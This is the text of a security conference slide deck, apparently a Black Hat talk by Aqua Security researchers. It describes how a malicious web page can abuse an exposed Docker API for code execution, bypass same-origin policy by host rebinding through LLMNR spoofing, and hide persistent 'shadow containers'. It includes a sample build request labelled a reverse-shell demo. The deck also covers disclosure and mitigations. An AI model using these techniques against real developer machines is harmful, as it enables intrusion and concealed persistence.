Well, That Escalated Quickly!
How abusing the Docker API Led to Remote Code Execution, Same Origin Bypass and Persistence in the Hypervisor via Shadow Containers.

Michael Cherny @chernymi

Sagie Dulce @SagieSec

WHO ARE WE?
Michael Cherny Head of Research
Aqua Security @chernymi

Sagie Dulce Sr Security Researcher
Aqua Security @SagieSec
2

FOCUS
 Developers are the new Targets
3

FOCUS
 Developers are the new Targets  Main Course: APT  Developer Running Docker
4

FOCUS
 Developers are the new Targets  Main Course: APT  Developer Running Docker  New Attacks: Host Rebinding & Shadow Container
5

MENU
 Containers & Container Development  Attacking Developers
 Abusing Docker API   Host Rebinding Attack   Shadow Containers 
 Full Attack -> Click 2 PWN  Conclusions
6

CONTAINERS?

VIRTUAL MACHINES VS CONTAINERS

www.serverspace.co.uk/blog/containerisation-vs-virtualisation-whats-the-difference

8

CONTAINERS EVERYWHERE
 Linux Containers
 Linux / Windows / Mac
 Windows Containers
 Native / Hyper-V (Windows Server)  Hyper-V (windows 10)
9

CONTAINER ADOPTION STATS

https://www.slideshare.net/Docker/dockercon-2017-general-session-day-1-ben-golub

10

DEVELOPERS AS TARGETS
 High privileges on their machines & domain  Low security attention  High Confidence  Access to sensitive data
 Code  IP  Registries
11

DEVELOPERS AS TARGETS
12

DEVELOPERS AS TARGETS
13

ATTACK OVERVIEW
ATTACKING CONTAINER DEVELOPERS

ATTACK OVERVIEW
15

ATTACK OVERVIEW
16

ATTACK OVERVIEW ­ WINDOWS 10

Abuse Docker  Remote Code Execution
API

Host Rebinding  Privilege Escalation

Shadow Container



Persistency

17

ABUSING DOCKER API
FROM A MALICIOUS WEB PAGE



DOCKER 4 WINDOWS / MAC
 Client talks to daemon over via REST API
 UNIX socket  named pipe  ..or TCP port
 TCP port was default on Windows 10
19

DOCKER 4 WINDOWS / MAC
 Client talks to daemon over via REST API
 UNIX socket  named pipe  ..or TCP port
 TCP port was default on Windows 10
 Abuse Remotely?
20

DOCKER REST API ­ CAN WE ATTACK IT?
 It's complicated
 Same Origin Policy?!
21

BROWSER SECURITY
 Browsers need to display content from multiple domains  But, one domain shouldn't be able to read / write to another
 Post status in Facebook  Collect underpants...  etc.
22

SAME ORIGIN POLICY (SOP)
 Only "simple" requests are allowed across origins
 GET ­ can't read response body  POST ­ can't send with a body / not all header types  HEAD
 Not same origin:
 request has different domain, protocol or port
23

DOCKER API CALLS THAT DON'T VIOLATE SOP

 List containers (GET)  Inspect container (GET)  List processes in container (GET)  Get container logs (GET)  Get container's changes in filesystem
(GET)  Export container (GET)  Get container stats (GET)  Resize Container (POST)  Start Container (POST)  List images (GET)  Build image (POST)  Create image (POST)  Get image history (GET)  Push image (POST)

 Stop Container (POST)  Restart container (POST)  Kill a container (POST)  Rename container (POST)  Pause container (POST)  Unpause container (POST)  Attach to a container (POST)  Get file info in a container (HEAD)  Get filesystem archive (GET)  Delete Container (POST)  List networks (GET)  Inspect Network (GET)  Tag image (POST)  List volumes (GET)  Export image (GET)

 Inspect volume (GET)  List secrets (GET)  Create secret (POST)  Inspect secret (GET)  Inspect Swarm (GET)  List nodes (GET)  Inspect node (GET)  List services (GET)  Inspect service (GET)  Get service logs (GET)  List tasks (GET)  Inspect a task (GET)  Search image (GET)  Delete image (DELETE)

https://docs.docker.com/engine/api/v1.29/

24

DOCKER API CALLS THAT DON'T VIOLATE SOP

 List containers (GET)  Inspect container (GET)  List processes in container (GET)  Get container logs (GET)  Get container's changes in filesystem
(GET)  Export container (GET)  Get container stats (GET)  Resize Container (POST)  Start Container (POST)  List images (GET)  Build image (POST)  Create image (POST)  Get image history (GET)  Push image (POST)

 Stop Container (POST)  Restart container (POST)  Kill a container (POST)  Rename container (POST)  Pause container (POST)  Unpause container (POST)  Attach to a container (POST)  Get file info in a container (HEAD)  Get filesystem archive (GET)  Delete Container (POST)  List networks (GET)  Inspect Network (GET)  Tag image (POST)  List volumes (GET)  Export image (GET)

 Inspect volume (GET)  List secrets (GET)  Create secret (POST)  Inspect secret (GET)  Inspect Swarm (GET)  List nodes (GET)  Inspect node (GET)  List services (GET)  Inspect service (GET)  Get service logs (GET)  List tasks (GET)  Inspect a task (GET)  Search image (GET)  Delete image (DELETE)

https://docs.docker.com/engine/api/v1.29/

25

BUILD IMAGE
 Build images from Dockerfile
FROM alpine:latest ADD mycode.sh RUN apt-get update && apt-get install ­y ... RUN ./mycode.sh
26

BUILD IMAGE
 Build images from Dockerfile
FROM alpine:latest ADD mycode.sh
RUN apt-get update && apt-get install ­y ... RUN ./mycode.sh
 ... Build == Execute code!

Execute Yourself
27

BUILD IMAGE API CALL
 POST /build  No body => no SOP violation!  Interesting build parameters
28

BUILD IMAGE API CALL
 POST /build  No body => no SOP violation!  Interesting build parameters
 t (tag)
29

BUILD IMAGE API CALL
 POST /build  No body => no SOP violation!  Interesting build parameters
 t (tag)  remote
 git repository!
30

BUILD IMAGE API CALL
 POST /build  No body => no SOP violation!  Interesting build parameters
 t (tag)  remote
 git repository!
 networkmode (bridge / host / none)
31

BUILD IMAGE API CALL  REVERSE SHELL DEMO
POST http://localhost:2375/build? remote=https://github.com/<User>/<Repo> &networkmode=host
32

BUILD IMAGE API CALL  REVERSE SHELL DEMO
33

ABUSE DOCKER BUILD
34

ABUSE DOCKER BUILD
35

ABUSE DOCKER BUILD
36

ABUSE DOCKER BUILD
37

ABUSE DOCKER BUILD
38

ABUSE DOCKER BUILD
39

ABUSE DOCKER BUILD DEMO
40

DOCKER FIX
 We disclosed to Docker  TCP now an "opt-in"
41

 HOST REBINDING ATTACK DAEMON PRIVILEGE ESCALATION

WHAT'S NEXT?
43

LIMITATIONS
44

LIMITATIONS
45

DNS REBINDING?
46

DNS REBINDING - HISTORY
 Carbon Dated to ~1996  2007 Protecting Browsers from DNS Rebinding Attacks  2008 Defending your DNS in a post-Kaminsky world  2010 How to Hack Millions of Routers
47

DNS REBINDING ­ HOW IT WORKS
48

DNS REBINDING ­ HOW IT WORKS
49

DNS REBINDING ­ HOW IT WORKS
50

DNS REBINDING ­ HOW IT WORKS
51

DNS REBINDING ­ HOW IT WORKS
52

DNS REBINDING ­ HOW IT WORKS
53

DNS REBINDING ­ HOW IT WORKS
SOP BYPASSED!
54

WHY NOT USE DNS REBINDING?
 DNS Rebinding may fail
 Existing protections (perimeter)
 Attacker needs to setup domain
 $$$  Maintenance  IP Reputation & Threat Intelligence
55

LLMNR: DNS OVER THE LAN
 Name resolution over the LAN  LLMNR
 DNS like resolution  IPv4 & IPv6
56

ATTACKING LLMNR
 Requests broadcasted over virtual interface!  Spoof LLMNR Replies
 Cached in the browser (IE / Chrome / FF) for ~60 seconds  Skip cache in FF
 Delay HTTP response 0.5 sec

https://tools.ietf.org/html/rfc4795#section-2.2

57

HOST REBINDING DEMO
58

HOST REBINDING DEMO
59

HOST REBINDING DEMO
60

HOST REBINDING DEMO
61

HOST REBINDING DEMO
62

HOST REBINDING DEMO
63

HOST REBINDING DEMO
64

HOST REBINDING DEMO
65

HOST REBINDING DEMO
66

HOST REBINDING DEMO
SOP BYPASSED!
67

HOST REBINDING DEMO
SOP BYPASSED!
68

HOST REBINDING DEMO
SOP BYPASSED!
69

HOST REBINDING DEMO
70

RECAP

Abuse Docker  Remote Code Execution
API
Host Rebinding  Privilege Escalation Full API Access: docker run ...?
71

SHADOW CONTAINER



PERSISTENCE & CONCEALMENT

MISSING PERSISTENCE & CONCEALMENT
 So Far...
 Privileged container on the VM (Moby Linux)  Access to VM filesystem  Access to enterprise internal network
 But...
 Not Concealed: docker ps  Not Persistent: VM boots from image
73

PERSISTENT AND CONCEALED
myscript
74

PERSISTENT AND CONCEALED
shadow
75

PERSISTENT AND CONCEALED
shadow
76

PERSISTENT AND CONCEALED
myscript
77

SHADOW CONTAINER ­ SHUTDOWN SCRIPT
78

SHADOW CONTAINER ­ MYSCRIPT.SH
79

SHADOW CONTAINER DEMO
80

FULL ATTACK

CLICK TO PWN!

FULL ATTACK DEMO
82

FULL ATTACK DEMO

Abuse Docker API

83

FULL ATTACK DEMO

Abuse Docker API
Host Rebinding
84

FULL ATTACK DEMO

Abuse Docker API
Host Rebinding
85

FULL ATTACK DEMO

Abuse Docker API
Host Rebinding
86

FULL ATTACK DEMO

Abuse Docker API
Host Rebinding Shadow Container
87

FULL ATTACK DEMO

Abuse Docker API
Host Rebinding Shadow Container
88

FULL ATTACK DEMO

Abuse Docker API
Host Rebinding Shadow Container
89

FULL ATTACK DEMO

Abuse Docker API
Host Rebinding Shadow Container
90

FULL ATTACK DEMO
shadow

Abuse Docker API
Host Rebinding Shadow Container
91

FULL ATTACK DEMO
shadow

Abuse Docker API
Host Rebinding Shadow Container
92

FULL ATTACK DEMO

Abuse Docker API
Host Rebinding Shadow Container
93

FULL ATTACK DEMO
myscript

Abuse Docker API
Host Rebinding Shadow Container
94

FULL ATTACK DEMO
95

IMPACT

DEVELOPERS AS TARGETS

ADVANCED PERSISTENT THREAT
 Persistency  Concealment  Low Forensic Footprint  Access to Internal Enterprise Network
97

SHADOW WORM
 Attacker poisons images  Bad image spread like a worm in pipeline
98

ATTACK FLAVORS

MAC
· DNS Rebinding
· Shadow Container

Linux
· DNS Rebinding
· Full Access

Windows Containers
· Abuse API · Host
Rebinding · Full Access

99

CONCLUSIONS

MITIGATION
 Don't expose container engine API  Only allow authenticated clients (certificates) access to
exposed port (or block it via Firewall)  Analyze Container Engine Logs (on development also)  Disable NetBIOS & LLMNR  Continuously scan images in registries  Continuously monitor containers in runtime
101

BLACK HAT SOUND BYTES
 Developers are the new Targets  New Attacks: Host Rebinding & Shadow Container  Protect your PIPE: Scan images & Monitor Containers in
Runtime

http://info.aquasec.com/whitepaper-how-abusing-docker-api-led-to-remote-code-execution

Michael Cherny @chernymi Sagie Dulce @SagieSec

102

